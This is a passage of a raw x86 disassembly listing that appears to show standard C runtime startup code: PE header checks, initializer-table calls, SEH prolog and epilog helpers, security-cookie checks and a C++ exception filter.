  4056b9:	add    esp,0xc
  4056bc:	pop    ebp
  4056bd:	ret    0x8
  4056c0:	int3   
  4056c1:	int3   
  4056c2:	int3   
  4056c3:	int3   
  4056c4:	int3   
  4056c5:	mov    edi,edi
  4056c7:	push   ebp
  4056c8:	mov    ebp,esp
  4056ca:	push   ecx
  4056cb:	lea    eax,[ebp+0x8]
  4056ce:	push   eax
  4056cf:	push   0x4020f2
  4056d4:	push   0x402190
  4056d9:	call   0x4063c6
  4056de:	add    esp,0xc
  4056e1:	mov    DWORD PTR [ebp-0x4],eax
  4056e4:	mov    eax,DWORD PTR [ebp-0x4]
  4056e7:	leave  
  4056e8:	ret    0x8
  4056eb:	int3   
  4056ec:	int3   
  4056ed:	int3   
  4056ee:	int3   
  4056ef:	int3   
  4056f0:	mov    edi,edi
  4056f2:	push   ebp
  4056f3:	mov    ebp,esp
  4056f5:	push   ecx
  4056f6:	lea    eax,[ebp+0x8]
  4056f9:	push   eax
  4056fa:	push   0x40211c
  4056ff:	push   0x402190
  405704:	call   0x4063c6
  405709:	add    esp,0xc
  40570c:	mov    DWORD PTR [ebp-0x4],eax
  40570f:	mov    eax,DWORD PTR [ebp-0x4]
  405712:	leave  
  405713:	ret    0x4
  405716:	int3   
  405717:	int3   
  405718:	int3   
  405719:	int3   
  40571a:	int3   
  40571b:	mov    eax,0x5a4d
  405720:	cmp    WORD PTR ds:0x400000,ax
  405727:	je     0x40572d
  405729:	xor    eax,eax
  40572b:	jmp    0x40577b
  40572d:	mov    ecx,DWORD PTR ds:0x40003c
  405733:	cmp    DWORD PTR [ecx+0x400000],0x4550
  40573d:	jne    0x405729
  40573f:	movzx  eax,WORD PTR [ecx+0x400018]
  405746:	cmp    eax,0x10b
  40574b:	je     0x405767
  40574d:	cmp    eax,0x20b
  405752:	jne    0x405729
  405754:	xor    eax,eax
  405756:	cmp    DWORD PTR [ecx+0x400084],0xe
  40575d:	jbe    0x40577b
  40575f:	cmp    DWORD PTR [ecx+0x4000f8],eax
  405765:	jmp    0x405778
  405767:	xor    eax,eax
  405769:	cmp    DWORD PTR [ecx+0x400074],0xe
  405770:	jbe    0x40577b
  405772:	cmp    DWORD PTR [ecx+0x4000e8],eax
  405778:	setne  al
  40577b:	push   0x2
  40577d:	mov    ds:0x407db8,eax
  405782:	call   0x405eff
  405787:	push   eax
  405788:	call   DWORD PTR ds:0x4093ec
  40578e:	or     DWORD PTR ds:0x408140,0xffffffff
  405795:	or     DWORD PTR ds:0x408144,0xffffffff
  40579c:	pop    ecx
  40579d:	pop    ecx
  40579e:	call   DWORD PTR ds:0x4093cc
  4057a4:	mov    ecx,DWORD PTR ds:0x407dcc
  4057aa:	mov    DWORD PTR [eax],ecx
  4057ac:	call   DWORD PTR ds:0x4093f8
  4057b2:	mov    ecx,DWORD PTR ds:0x407dc0
  4057b8:	mov    DWORD PTR [eax],ecx
  4057ba:	call   0x406166
  4057bf:	cmp    DWORD PTR ds:0x407a20,0x0
  4057c6:	jne    0x4057d4
  4057c8:	push   0x406166
  4057cd:	call   DWORD PTR ds:0x4093d4
  4057d3:	pop    ecx
  4057d4:	call   0x40616e
  4057d9:	xor    eax,eax
  4057db:	ret    
  4057dc:	int3   
  4057dd:	int3   
  4057de:	int3   
  4057df:	int3   
  4057e0:	int3   
  4057e1:	mov    eax,ds:0x407dc8
  4057e6:	push   0x407dbc
  4057eb:	push   DWORD PTR ds:0x407dc4
  4057f1:	mov    ds:0x407dbc,eax
  4057f6:	push   0x407db0
  4057fb:	push   0x407dac
  405800:	push   0x407da8
  405805:	call   DWORD PTR ds:0x4093f0
  40580b:	add    esp,0x14
  40580e:	mov    ds:0x407db4,eax
  405813:	ret    
  405814:	int3   
  405815:	int3   
  405816:	int3   
  405817:	int3   
  405818:	int3   
  405819:	mov    edi,edi
  40581b:	push   ebp
  40581c:	mov    ebp,esp
  40581e:	push   esi
  40581f:	mov    esi,DWORD PTR [ebp+0x8]
  405822:	xor    eax,eax
  405824:	jmp    0x405835
  405826:	test   eax,eax
  405828:	jne    0x40583a
  40582a:	mov    ecx,DWORD PTR [esi]
  40582c:	test   ecx,ecx
  40582e:	je     0x405832
  405830:	call   ecx
  405832:	add    esi,0x4
  405835:	cmp    esi,DWORD PTR [ebp+0xc]
  405838:	jb     0x405826
  40583a:	pop    esi
  40583b:	pop    ebp
  40583c:	ret    
  40583d:	int3   
  40583e:	int3   
  40583f:	int3   
  405840:	int3   
  405841:	int3   
  405842:	push   0x58
  405844:	push   0x406430
  405849:	call   0x405a50
  40584e:	xor    ebx,ebx
  405850:	mov    DWORD PTR [ebp-0x20],ebx
  405853:	mov    DWORD PTR [ebp-0x4],ebx
  405856:	lea    eax,[ebp-0x68]
  405859:	push   eax
  40585a:	call   DWORD PTR ds:0x4092d4
  405860:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405867:	mov    DWORD PTR [ebp-0x4],0x1
  40586e:	mov    eax,fs:0x18
  405874:	mov    edi,DWORD PTR [eax+0x4]
  405877:	mov    esi,ebx
  405879:	push   ebx
  40587a:	push   edi
  40587b:	push   0x408148
  405880:	call   DWORD PTR ds:0x4092d8
  405886:	test   eax,eax
  405888:	je     0x4058a2
  40588a:	cmp    eax,edi
  40588c:	jne    0x405895
  40588e:	xor    edi,edi
  405890:	inc    edi
  405891:	mov    esi,edi
  405893:	jmp    0x4058a5
  405895:	push   0x3e8
  40589a:	call   DWORD PTR ds:0x4092e0
  4058a0:	jmp    0x405879
  4058a2:	xor    edi,edi
  4058a4:	inc    edi
  4058a5:	cmp    DWORD PTR ds:0x40814c,edi
  4058ab:	jne    0x4058b7
  4058ad:	push   0x1f
  4058af:	call   0x405f3a
  4058b4:	pop    ecx
  4058b5:	jmp    0x4058e5
  4058b7:	cmp    DWORD PTR ds:0x40814c,ebx
  4058bd:	jne    0x4058df
  4058bf:	mov    DWORD PTR ds:0x40814c,edi
  4058c5:	push   0x401018
  4058ca:	push   0x40100c
  4058cf:	call   0x405819
  4058d4:	pop    ecx
  4058d5:	pop    ecx
  4058d6:	test   eax,eax
  4058d8:	je     0x4058e5
  4058da:	jmp    0x405a14
  4058df:	mov    DWORD PTR ds:0x407da4,edi
  4058e5:	cmp    DWORD PTR ds:0x40814c,edi
  4058eb:	jne    0x405908
  4058ed:	push   0x401008
  4058f2:	push   0x401000
  4058f7:	call   0x406186
  4058fc:	pop    ecx
  4058fd:	pop    ecx
  4058fe:	mov    DWORD PTR ds:0x40814c,0x2
  405908:	test   esi,esi
  40590a:	jne    0x405918
  40590c:	push   ebx
  40590d:	push   0x408148
  405912:	call   DWORD PTR ds:0x4092dc
  405918:	cmp    DWORD PTR ds:0x408154,0x0
  40591f:	je     0x40593a
  405921:	push   0x408154
  405926:	call   0x406000
  40592b:	pop    ecx
  40592c:	test   eax,eax
  40592e:	je     0x40593a
  405930:	push   ebx
  405931:	push   0x2
  405933:	push   ebx
  405934:	call   DWORD PTR ds:0x408154
  40593a:	mov    eax,ds:0x4093dc
  40593f:	mov    esi,DWORD PTR [eax]
  405941:	mov    DWORD PTR [ebp-0x1c],esi
  405944:	mov    edi,DWORD PTR [ebp-0x20]
  405947:	mov    cl,BYTE PTR [esi]
  405949:	cmp    cl,0x20
  40594c:	ja     0x405997
  40594e:	test   cl,cl
  405950:	je     0x405956
  405952:	test   edi,edi
  405954:	jne    0x405997
  405956:	mov    al,BYTE PTR [esi]
  405958:	test   al,al
  40595a:	je     0x405966
  40595c:	cmp    al,0x20
  40595e:	ja     0x405966
  405960:	inc    esi
  405961:	mov    DWORD PTR [ebp-0x1c],esi
  405964:	jmp    0x405956
  405966:	test   BYTE PTR [ebp-0x3c],0x1
  40596a:	je     0x405972
  40596c:	movzx  eax,WORD PTR [ebp-0x38]
  405970:	jmp    0x405975
  405972:	push   0xa
  405974:	pop    eax
  405975:	push   eax
  405976:	push   esi
  405977:	push   ebx
  405978:	push   0x400000
  40597d:	call   0x4022e5
  405982:	mov    ds:0x407da0,eax
  405987:	cmp    DWORD PTR ds:0x407db8,0x0
  40598e:	jne    0x4059f0
  405990:	push   eax
  405991:	call   DWORD PTR ds:0x4093e8
  405997:	cmp    cl,0x22
  40599a:	jne    0x4059a8
  40599c:	xor    eax,eax
  40599e:	test   edi,edi
  4059a0:	sete   al
  4059a3:	mov    edi,eax
  4059a5:	mov    DWORD PTR [ebp-0x20],edi
  4059a8:	movzx  eax,cl
  4059ab:	push   eax
  4059ac:	call   DWORD PTR ds:0x4093d0
  4059b2:	pop    ecx
  4059b3:	test   eax,eax
  4059b5:	je     0x4059bb
  4059b7:	inc    esi
  4059b8:	mov    DWORD PTR [ebp-0x1c],esi
  4059bb:	inc    esi
  4059bc:	mov    DWORD PTR [ebp-0x1c],esi
  4059bf:	jmp    0x405947
  4059c1:	mov    ecx,DWORD PTR [ebp-0x14]
  4059c4:	mov    eax,DWORD PTR [ecx]
  4059c6:	mov    eax,DWORD PTR [eax]
  4059c8:	mov    DWORD PTR [ebp-0x24],eax
  4059cb:	push   ecx
  4059cc:	push   eax
  4059cd:	call   0x405e8e
  4059d2:	pop    ecx
  4059d3:	pop    ecx
  4059d4:	ret    
  4059d5:	mov    esp,DWORD PTR [ebp-0x18]
  4059d8:	mov    eax,DWORD PTR [ebp-0x24]
  4059db:	mov    ds:0x407da0,eax
  4059e0:	cmp    DWORD PTR ds:0x407db8,0x0
  4059e7:	jne    0x4059f0
  4059e9:	push   eax
  4059ea:	call   DWORD PTR ds:0x4093d8
  4059f0:	cmp    DWORD PTR ds:0x407da4,0x0
  4059f7:	jne    0x405a04
  4059f9:	call   DWORD PTR ds:0x4093c8
  4059ff:	mov    eax,ds:0x407da0
  405a04:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405a0b:	jmp    0x405a20
  405a0d:	xor    eax,eax
  405a0f:	inc    eax
  405a10:	ret    
  405a11:	mov    esp,DWORD PTR [ebp-0x18]
  405a14:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405a1b:	mov    eax,0xff
  405a20:	call   0x405a95
  405a25:	ret    
  405a26:	int3   
  405a27:	int3   
  405a28:	int3   
  405a29:	int3   
  405a2a:	int3   
  405a2b:	call   0x4060c1
  405a30:	jmp    0x405842
  405a35:	int3   
  405a36:	int3   
  405a37:	int3   
  405a38:	int3   
  405a39:	int3   
  405a3a:	cmp    ecx,DWORD PTR ds:0x407a10
  405a40:	jne    0x405a45
  405a42:	ret    0x0
  405a45:	jmp    0x406191
  405a4a:	int3   
  405a4b:	int3   
  405a4c:	int3   
  405a4d:	int3   
  405a4e:	int3   
  405a4f:	int3   
  405a50:	push   0x405b0c
  405a55:	push   DWORD PTR fs:0x0
  405a5c:	mov    eax,DWORD PTR [esp+0x10]
  405a60:	mov    DWORD PTR [esp+0x10],ebp
  405a64:	lea    ebp,[esp+0x10]
  405a68:	sub    esp,eax
  405a6a:	push   ebx
  405a6b:	push   esi
  405a6c:	push   edi
  405a6d:	mov    eax,ds:0x407a10
  405a72:	xor    DWORD PTR [ebp-0x4],eax
  405a75:	xor    eax,ebp
  405a77:	push   eax
  405a78:	mov    DWORD PTR [ebp-0x18],esp
  405a7b:	push   DWORD PTR [ebp-0x8]
  405a7e:	mov    eax,DWORD PTR [ebp-0x4]
  405a81:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405a88:	mov    DWORD PTR [ebp-0x8],eax
  405a8b:	lea    eax,[ebp-0x10]
  405a8e:	mov    fs:0x0,eax
  405a94:	ret    
  405a95:	mov    ecx,DWORD PTR [ebp-0x10]
  405a98:	mov    DWORD PTR fs:0x0,ecx
  405a9f:	pop    ecx
  405aa0:	pop    edi
  405aa1:	pop    edi
  405aa2:	pop    esi
  405aa3:	pop    ebx
  405aa4:	mov    esp,ebp
  405aa6:	pop    ebp
  405aa7:	push   ecx
  405aa8:	ret    
  405aa9:	int3   
  405aaa:	int3   
  405aab:	int3   
  405aac:	int3   
  405aad:	int3   
  405aae:	int3   
  405aaf:	int3   
  405ab0:	push   0x405b0c
  405ab5:	push   DWORD PTR fs:0x0
  405abc:	mov    eax,DWORD PTR [esp+0x10]
  405ac0:	mov    DWORD PTR [esp+0x10],ebp
  405ac4:	lea    ebp,[esp+0x10]
  405ac8:	sub    esp,eax
  405aca:	push   ebx
  405acb:	push   esi
  405acc:	push   edi
  405acd:	mov    eax,ds:0x407a10
  405ad2:	xor    DWORD PTR [ebp-0x4],eax
  405ad5:	xor    eax,ebp
  405ad7:	mov    DWORD PTR [ebp-0x1c],eax
  405ada:	push   eax
  405adb:	mov    DWORD PTR [ebp-0x18],esp
  405ade:	push   DWORD PTR [ebp-0x8]
  405ae1:	mov    eax,DWORD PTR [ebp-0x4]
  405ae4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405aeb:	mov    DWORD PTR [ebp-0x8],eax
  405aee:	lea    eax,[ebp-0x10]
  405af1:	mov    fs:0x0,eax
  405af7:	ret    
  405af8:	mov    ecx,DWORD PTR [ebp-0x1c]
  405afb:	xor    ecx,ebp
  405afd:	call   0x405a3a
  405b02:	jmp    0x405a95
  405b07:	int3   
  405b08:	int3   
  405b09:	int3   
  405b0a:	int3   
  405b0b:	int3   
  405b0c:	mov    edi,edi
  405b0e:	push   ebp
  405b0f:	mov    ebp,esp
  405b11:	push   DWORD PTR [ebp+0x14]
  405b14:	push   DWORD PTR [ebp+0x10]
  405b17:	push   DWORD PTR [ebp+0xc]
  405b1a:	push   DWORD PTR [ebp+0x8]
  405b1d:	push   0x405a3a
  405b22:	push   0x407a10
  405b27:	call   0x405ca0
  405b2c:	add    esp,0x18
  405b2f:	pop    ebp
  405b30:	ret    
  405b31:	int3   
  405b32:	int3   
  405b33:	int3   
  405b34:	int3   
  405b35:	int3   
  405b36:	jmp    DWORD PTR ds:0x409400
  405b3c:	int3   
  405b3d:	int3   
  405b3e:	int3   
  405b3f:	int3   
  405b40:	int3   
  405b41:	int3   
  405b42:	int3   
  405b43:	int3   
  405b44:	int3   
  405b45:	int3   
  405b46:	int3   
  405b47:	int3   
  405b48:	push   ebx
  405b49:	push   esi
  405b4a:	push   edi
  405b4b:	mov    edx,DWORD PTR [esp+0x10]
  405b4f:	mov    eax,DWORD PTR [esp+0x14]
  405b53:	mov    ecx,DWORD PTR [esp+0x18]
  405b57:	push   ebp
  405b58:	push   edx
  405b59:	push   eax
  405b5a:	push   ecx
  405b5b:	push   ecx
  405b5c:	push   0x405bd8
  405b61:	push   DWORD PTR fs:0x0
  405b68:	mov    eax,ds:0x407a10
  405b6d:	xor    eax,esp
  405b6f:	mov    DWORD PTR [esp+0x8],eax
  405b73:	mov    DWORD PTR fs:0x0,esp
  405b7a:	mov    eax,DWORD PTR [esp+0x30]
  405b7e:	mov    ebx,DWORD PTR [eax+0x8]
  405b81:	mov    ecx,DWORD PTR [esp+0x2c]
  405b85:	xor    ebx,DWORD PTR [ecx]
  405b87:	mov    esi,DWORD PTR [eax+0xc]
  405b8a:	cmp    esi,0xfffffffe
  405b8d:	je     0x405bca
  405b8f:	mov    edx,DWORD PTR [esp+0x34]
  405b93:	cmp    edx,0xfffffffe
  405b96:	je     0x405b9c
  405b98:	cmp    esi,edx
  405b9a:	jbe    0x405bca
  405b9c:	lea    esi,[esi+esi*2]
  405b9f:	lea    ebx,[ebx+esi*4+0x10]
  405ba3:	mov    ecx,DWORD PTR [ebx]
  405ba5:	mov    DWORD PTR [eax+0xc],ecx
  405ba8:	cmp    DWORD PTR [ebx+0x4],0x0
  405bac:	jne    0x405b7a
  405bae:	push   0x101
  405bb3:	mov    eax,DWORD PTR [ebx+0x8]
  405bb6:	call   0x406355
  405bbb:	mov    ecx,0x1
  405bc0:	mov    eax,DWORD PTR [ebx+0x8]
  405bc3:	call   0x406374
  405bc8:	jmp    0x405b7a
  405bca:	pop    DWORD PTR fs:0x0
  405bd1:	add    esp,0x18
  405bd4:	pop    edi
  405bd5:	pop    esi
  405bd6:	pop    ebx
  405bd7:	ret    
  405bd8:	mov    ecx,DWORD PTR [esp+0x4]
  405bdc:	test   DWORD PTR [ecx+0x4],0x6
  405be3:	mov    eax,0x1
  405be8:	je     0x405c1d
  405bea:	mov    eax,DWORD PTR [esp+0x8]
  405bee:	mov    ecx,DWORD PTR [eax+0x8]
  405bf1:	xor    ecx,eax
  405bf3:	call   0x405a3a
  405bf8:	push   ebp
  405bf9:	mov    ebp,DWORD PTR [eax+0x18]
  405bfc:	push   DWORD PTR [eax+0xc]
  405bff:	push   DWORD PTR [eax+0x10]
  405c02:	push   DWORD PTR [eax+0x14]
  405c05:	call   0x405b48
  405c0a:	add    esp,0xc
  405c0d:	pop    ebp
  405c0e:	mov    eax,DWORD PTR [esp+0x8]
  405c12:	mov    edx,DWORD PTR [esp+0x10]
  405c16:	mov    DWORD PTR [edx],eax
  405c18:	mov    eax,0x3
  405c1d:	ret    
  405c1e:	push   ebp
  405c1f:	mov    ecx,DWORD PTR [esp+0x8]
  405c23:	mov    ebp,DWORD PTR [ecx]
  405c25:	push   DWORD PTR [ecx+0x1c]
  405c28:	push   DWORD PTR [ecx+0x18]
  405c2b:	push   DWORD PTR [ecx+0x28]
  405c2e:	call   0x405b48
  405c33:	add    esp,0xc
  405c36:	pop    ebp
  405c37:	ret    0x4
  405c3a:	push   ebp
  405c3b:	push   esi
  405c3c:	push   edi
  405c3d:	push   ebx
  405c3e:	mov    ebp,edx
  405c40:	xor    eax,eax
  405c42:	xor    ebx,ebx
  405c44:	xor    edx,edx
  405c46:	xor    esi,esi
  405c48:	xor    edi,edi
  405c4a:	call   ecx
  405c4c:	pop    ebx
  405c4d:	pop    edi
  405c4e:	pop    esi
  405c4f:	pop    ebp
  405c50:	ret    
  405c51:	mov    ebp,edx
  405c53:	mov    esi,ecx
  405c55:	mov    eax,ecx
  405c57:	push   0x1
  405c59:	call   0x406355
  405c5e:	xor    eax,eax
  405c60:	xor    ebx,ebx
  405c62:	xor    ecx,ecx
  405c64:	xor    edx,edx
  405c66:	xor    edi,edi
  405c68:	jmp    esi
  405c6a:	push   ebp
  405c6b:	mov    ebp,esp
  405c6d:	push   ebx
  405c6e:	push   esi
  405c6f:	push   edi
  405c70:	push   0x0
  405c72:	push   0x0
  405c74:	push   0x405c7f
  405c79:	push   ecx
  405c7a:	call   0x4063d2
  405c7f:	pop    edi
  405c80:	pop    esi
  405c81:	pop    ebx
  405c82:	pop    ebp
  405c83:	ret    
  405c84:	push   ebp
  405c85:	mov    ebp,DWORD PTR [esp+0x8]
  405c89:	push   edx
  405c8a:	push   ecx
  405c8b:	push   DWORD PTR [esp+0x14]
  405c8f:	call   0x405b48
  405c94:	add    esp,0xc
  405c97:	pop    ebp
  405c98:	ret    0x8
  405c9b:	int3   
  405c9c:	int3   
  405c9d:	int3   
  405c9e:	int3   
  405c9f:	int3   
  405ca0:	mov    edi,edi
  405ca2:	push   ebp
  405ca3:	mov    ebp,esp
  405ca5:	sub    esp,0x18
  405ca8:	mov    eax,DWORD PTR [ebp+0x8]
  405cab:	mov    edx,DWORD PTR [ebp+0xc]
  405cae:	push   ebx
  405caf:	mov    ebx,DWORD PTR [ebp+0x14]
  405cb2:	push   esi
  405cb3:	push   edi
  405cb4:	mov    edi,DWORD PTR [ebx+0x8]
  405cb7:	xor    edi,DWORD PTR [eax]
  405cb9:	mov    BYTE PTR [ebp-0x1],0x0
  405cbd:	mov    eax,DWORD PTR [edi]
  405cbf:	mov    DWORD PTR [ebp-0xc],0x1
  405cc6:	lea    esi,[ebx+0x10]
  405cc9:	cmp    eax,0xfffffffe
  405ccc:	je     0x405cdb
  405cce:	mov    ecx,DWORD PTR [edi+0x4]
  405cd1:	add    ecx,esi
  405cd3:	xor    ecx,DWORD PTR [eax+esi*1]
  405cd6:	call   edx
  405cd8:	mov    edx,DWORD PTR [ebp+0xc]
  405cdb:	mov    ecx,DWORD PTR [edi+0xc]
  405cde:	mov    eax,DWORD PTR [edi+0x8]
  405ce1:	add    ecx,esi
  405ce3:	xor    ecx,DWORD PTR [eax+esi*1]
  405ce6:	call   edx
  405ce8:	mov    eax,DWORD PTR [ebp+0x10]
  405ceb:	test   BYTE PTR [eax+0x4],0x66
  405cef:	jne    0x405ded
  405cf5:	mov    DWORD PTR [ebp-0x18],eax
  405cf8:	mov    eax,DWORD PTR [ebp+0x18]
  405cfb:	mov    DWORD PTR [ebp-0x14],eax
  405cfe:	lea    eax,[ebp-0x18]
  405d01:	mov    DWORD PTR [ebx-0x4],eax
  405d04:	mov    eax,DWORD PTR [ebx+0xc]
  405d07:	mov    DWORD PTR [ebp-0x8],eax
  405d0a:	cmp    eax,0xfffffffe
  405d0d:	je     0x405e24
  405d13:	lea    eax,[eax+eax*2]
  405d16:	add    eax,0x4
  405d19:	mov    ecx,DWORD PTR [edi+eax*4+0x4]
  405d1d:	mov    ebx,DWORD PTR [edi+eax*4]
  405d20:	lea    eax,[edi+eax*4]
  405d23:	mov    DWORD PTR [ebp-0x10],eax
  405d26:	test   ecx,ecx
  405d28:	je     0x405dcd
  405d2e:	mov    edx,esi
  405d30:	call   0x405c3a
  405d35:	mov    cl,0x1
  405d37:	mov    BYTE PTR [ebp-0x1],cl
  405d3a:	test   eax,eax
  405d3c:	js     0x405de4
  405d42:	jle    0x405dd0
  405d48:	mov    eax,DWORD PTR [ebp+0x10]
  405d4b:	cmp    DWORD PTR [eax],0xe06d7363
  405d51:	jne    0x405d7b
  405d53:	cmp    DWORD PTR ds:0x408150,0x0
  405d5a:	je     0x405d7b
  405d5c:	push   0x408150
  405d61:	call   0x406000
  405d66:	add    esp,0x4
  405d69:	test   eax,eax
  405d6b:	je     0x405d7b
  405d6d:	push   0x1
  405d6f:	push   DWORD PTR [ebp+0x10]
  405d72:	call   DWORD PTR ds:0x408150
  405d78:	add    esp,0x8
  405d7b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d7e:	call   0x405c6a
  405d83:	mov    edx,DWORD PTR [ebp-0x8]
  405d86:	mov    eax,DWORD PTR [ebp+0x14]
  405d89:	cmp    DWORD PTR [eax+0xc],edx
  405d8c:	je     0x405d9c
  405d8e:	push   DWORD PTR [ebp+0x8]
  405d91:	mov    ecx,eax
  405d93:	push   esi
  405d94:	call   0x405c84
  405d99:	mov    eax,DWORD PTR [ebp+0x14]
  405d9c:	mov    DWORD PTR [eax+0xc],ebx
  405d9f:	mov    eax,DWORD PTR [edi]
  405da1:	mov    ebx,DWORD PTR [ebp+0xc]
  405da4:	cmp    eax,0xfffffffe
  405da7:	je     0x405db3
  405da9:	mov    ecx,DWORD PTR [edi+0x4]
  405dac:	add    ecx,esi
  405dae:	xor    ecx,DWORD PTR [eax+esi*1]
  405db1:	call   ebx
  405db3:	mov    ecx,DWORD PTR [edi+0xc]
  405db6:	mov    eax,DWORD PTR [edi+0x8]
  405db9:	add    ecx,esi
  405dbb:	xor    ecx,DWORD PTR [eax+esi*1]
  405dbe:	call   ebx
  405dc0:	mov    ecx,DWORD PTR [ebp-0x10]
  405dc3:	mov    ecx,DWORD PTR [ecx+0x8]
  405dc6:	mov    edx,esi
  405dc8:	call   0x405c51
  405dcd:	mov    cl,BYTE PTR [ebp-0x1]
  405dd0:	mov    eax,ebx
  405dd2:	mov    DWORD PTR [ebp-0x8],ebx
  405dd5:	cmp    ebx,0xfffffffe
  405dd8:	jne    0x405d13
  405dde:	test   cl,cl
  405de0:	je     0x405e24
  405de2:	jmp    0x405e03
  405de4:	mov    DWORD PTR [ebp-0xc],0x0
  405deb:	jmp    0x405e03
  405ded:	cmp    DWORD PTR [ebx+0xc],0xfffffffe
  405df1:	je     0x405e24
  405df3:	push   DWORD PTR [ebp+0x8]
  405df6:	mov    ecx,ebx
  405df8:	push   esi
  405df9:	mov    edx,0xfffffffe
  405dfe:	call   0x405c84
  405e03:	mov    eax,DWORD PTR [edi]
  405e05:	mov    ebx,DWORD PTR [ebp+0xc]
  405e08:	cmp    eax,0xfffffffe
  405e0b:	je     0x405e17
  405e0d:	mov    ecx,DWORD PTR [edi+0x4]
  405e10:	add    ecx,esi
  405e12:	xor    ecx,DWORD PTR [eax+esi*1]
  405e15:	call   ebx
  405e17:	mov    ecx,DWORD PTR [edi+0xc]
  405e1a:	mov    edx,DWORD PTR [edi+0x8]
  405e1d:	add    ecx,esi
  405e1f:	xor    ecx,DWORD PTR [edx+esi*1]
  405e22:	call   ebx
  405e24:	mov    eax,DWORD PTR [ebp-0xc]
  405e27:	pop    edi
  405e28:	pop    esi
  405e29:	pop    ebx
  405e2a:	mov    esp,ebp
  405e2c:	pop    ebp
  405e2d:	ret    
  405e2e:	int3   
  405e2f:	int3   
  405e30:	int3   
  405e31:	int3   
  405e32:	int3   
  405e33:	mov    edi,edi
  405e35:	push   ebp
  405e36:	mov    ebp,esp
  405e38:	mov    eax,DWORD PTR [ebp+0x8]
  405e3b:	mov    eax,DWORD PTR [eax]
  405e3d:	cmp    DWORD PTR [eax],0xe06d7363
  405e43:	jne    0x405e70
  405e45:	cmp    DWORD PTR [eax+0x10],0x3
  405e49:	jne    0x405e70
  405e4b:	mov    eax,DWORD PTR [eax+0x14]
  405e4e:	cmp    eax,0x19930520
  405e53:	je     0x405e6a
  405e55:	cmp    eax,0x19930521
  405e5a:	je     0x405e6a
  405e5c:	cmp    eax,0x19930522
  405e61:	je     0x405e6a
  405e63:	cmp    eax,0x1994000
  405e68:	jne    0x405e70
  405e6a:	call   DWORD PTR ds:0x4093e0
  405e70:	xor    eax,eax
  405e72:	pop    ebp
  405e73:	ret    0x4
  405e76:	int3   
  405e77:	int3   
  405e78:	int3   
  405e79:	int3   
  405e7a:	int3   
  405e7b:	push   0x405e33
  405e80:	call   DWORD PTR ds:0x4092cc
  405e86:	xor    eax,eax
  405e88:	ret    
  405e89:	int3   
  405e8a:	int3   
  405e8b:	int3   
  405e8c:	int3   
  405e8d:	int3   
  405e8e:	jmp    DWORD PTR ds:0x4093fc
  405e94:	int3   
  405e95:	int3   
  405e96:	int3   
  405e97:	int3   
  405e98:	int3   
  405e99:	push   0xc
  405e9b:	push   0x406458
  405ea0:	call   0x405a50
  405ea5:	xor    eax,eax
  405ea7:	mov    ecx,DWORD PTR [ebp+0x8]
  405eaa:	test   ecx,ecx
  405eac:	je     0x405ef2
  405eae:	cmp    ecx,0xffffffff
  405eb1:	je     0x405ef2
  405eb3:	and    DWORD PTR [ebp-0x4],eax
  405eb6:	mov    edx,0x5a4d
  405ebb:	cmp    WORD PTR [ecx],dx
  405ebe:	jne    0x405eeb
  405ec0:	mov    edx,DWORD PTR [ecx+0x3c]
  405ec3:	test   edx,edx
  405ec5:	js     0x405eeb
  405ec7:	cmp    edx,0x10000000
  405ecd:	jae    0x405eeb
  405ecf:	lea    eax,[edx+ecx*1]
  405ed2:	mov    DWORD PTR [ebp-0x1c],eax
  405ed5:	cmp    DWORD PTR [eax],0x4550
  405edb:	je     0x405eeb
  405edd:	jmp    0x405ee6
  405edf:	xor    eax,eax
  405ee1:	inc    eax
  405ee2:	ret    
  405ee3:	mov    esp,DWORD PTR [ebp-0x18]
  405ee6:	xor    eax,eax
  405ee8:	mov    DWORD PTR [ebp-0x1c],eax
  405eeb:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405ef2:	call   0x405a95
  405ef7:	ret    0x4
  405efa:	int3   
  405efb:	int3   
  405efc:	int3   
  405efd:	int3   
  405efe:	int3   
  405eff:	mov    edi,edi
  405f01:	push   ebp
  405f02:	mov    ebp,esp
  405f04:	push   0x0
  405f06:	call   DWORD PTR ds:0x4092c8
  405f0c:	test   eax,eax
  405f0e:	je     0x405f30
  405f10:	push   eax
  405f11:	call   0x405e99
  405f16:	test   eax,eax
  405f18:	je     0x405f30
  405f1a:	movzx  ecx,WORD PTR [eax+0x5c]
  405f1e:	push   0x2
  405f20:	pop    eax
  405f21:	cmp    cx,ax
  405f24:	je     0x405f33
  405f26:	cmp    ecx,0x3
  405f29:	jne    0x405f30
  405f2b:	xor    eax,eax
  405f2d:	inc    eax
  405f2e:	pop    ebp
  405f2f:	ret    
  405f30:	mov    eax,DWORD PTR [ebp+0x8]
  405f33:	pop    ebp
  405f34:	ret    
  405f35:	int3   
  405f36:	int3   
  405f37:	int3   
  405f38:	int3   
  405f39:	int3   
  405f3a:	jmp    DWORD PTR ds:0x4093f4
  405f40:	int3   
  405f41:	int3   
  405f42:	int3   
  405f43:	int3   
  405f44:	int3   
  405f45:	int3   
  405f46:	int3   
  405f47:	int3   
  405f48:	int3   
  405f49:	int3   
  405f4a:	int3   
  405f4b:	int3   
  405f4c:	int3   
  405f4d:	int3   
  405f4e:	int3   
  405f4f:	int3   
  405f50:	mov    edi,edi
  405f52:	push   ebp
  405f53:	mov    ebp,esp
  405f55:	mov    eax,DWORD PTR [ebp+0x8]
  405f58:	mov    ecx,0x5a4d
  405f5d:	cmp    WORD PTR [eax],cx
  405f60:	je     0x405f66
  405f62:	xor    eax,eax
  405f64:	pop    ebp
  405f65:	ret    
  405f66:	mov    ecx,DWORD PTR [eax+0x3c]
  405f69:	add    ecx,eax
  405f6b:	xor    eax,eax
  405f6d:	cmp    DWORD PTR [ecx],0x4550
  405f73:	jne    0x405f81
  405f75:	mov    edx,0x10b
  405f7a:	cmp    WORD PTR [ecx+0x18],dx
  405f7e:	sete   al
  405f81:	pop    ebp
  405f82:	ret    
  405f83:	int3   
  405f84:	int3   
  405f85:	int3   
  405f86:	int3   
  405f87:	int3   
  405f88:	int3   
  405f89:	int3   
  405f8a:	int3   
  405f8b:	int3   
  405f8c:	int3   
  405f8d:	int3   
  405f8e:	int3   
  405f8f:	int3   
  405f90:	mov    edi,edi
  405f92:	push   ebp
  405f93:	mov    ebp,esp
  405f95:	mov    eax,DWORD PTR [ebp+0x8]
